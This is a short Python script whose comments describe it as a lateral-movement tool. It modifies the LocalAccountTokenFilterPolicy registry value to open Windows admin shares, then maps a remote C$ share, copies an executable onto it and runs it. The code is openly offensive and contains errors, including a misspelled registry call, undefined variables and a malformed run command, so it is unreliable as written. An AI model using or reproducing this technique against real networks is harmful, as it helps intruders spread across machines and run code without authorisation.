# Tool to access network file shares and send data.
# file share to gain lateral movement through a network
import os,winreg,shutil

# Enable file share on regsiter
def enableAdmininShar(computerName):
    regpath = "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    winreg.ConnectRegistery(computerName,winreg.HKEY_LOCAL_MACHINE)
    winreg.OpenKey(reg,regpath,0,access=winreg.KEY_WRITE)
    winreg.SetValueEx(key,"LocalAccountTokenFilterPolicy",0,winreg.REG_DWORD,1)
    # Reboot needed

# Access Admin share and send the data and execute file
def accessAdminShare(computerName,executable):
    # we use r for Raw
    remote = r"\\"+computerName+"\c$"  # share file on the local machine and c$ for c file share
    local = "z:" # we're going to back this file share to the local drive z
    remotefile = local + "\\"+executable
    localfile = os.path.join(os.getcwd(),executable)
    os.system("net use "+local+" "+remote) # using net use to have access to taht file share
    shutil.move(localfile,remotefile)
    os.system("python"+remotefile) # execute the file
    os.system("net use "+local+" /delete") # remove that file share from our local drive letter


accessAdminShare(os.environ["COMPUTERNAME"],"loka.py")
